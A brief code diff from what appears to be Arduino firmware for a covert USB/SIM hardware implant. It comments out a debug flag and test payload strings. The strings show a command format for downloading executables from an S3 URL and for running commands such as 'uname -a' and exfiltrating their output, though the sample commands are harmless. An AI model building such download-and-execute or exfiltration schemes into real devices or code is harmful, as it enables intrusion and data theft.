@@ -7,11 +7,11 @@
 // We need to comment the next line, #define DEBUG false won't work as expected
 //#define DEBUG true
 // Used by Oca to debug the code with an arduino without a SIM module and without an USB host
-#define DEBUGWITHOUTSIM true
+//#define DEBUGWITHOUTSIM true
 //#define DEBUGWITHOUTSIM_PAYLOAD "UnlockDownload##win##PASSWORD##https://s3.amazonaws.com/hellotesthellotesthello/hello.exe"
 //#define DEBUGWITHOUTSIM_PAYLOAD "UnlockDownload##osx##PASSWORD##https://s3.amazonaws.com/hellotesthellotesthello/hello_osx"
 //#define DEBUGWITHOUTSIM_PAYLOAD "UnlockDownload##lnx##PASSWORD##https://s3.amazonaws.com/hellotesthellotesthello/hello_lin"
-#define DEBUGWITHOUTSIM_PAYLOAD "UnlockRunAndExfil##win##test##mkdir %TEMP%\\malware"
+//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockRunAndExfil##win##PASSWORD##mkdir %TEMP%\\malware"
 //#define DEBUGWITHOUTSIM_PAYLOAD "UnlockRunAndExfil##osx##PASSWORD##uname -a"
 //#define DEBUGWITHOUTSIM_PAYLOAD "UnlockRunAndExfil##lnx##PASSWORD##touch /tmp/malware"
 
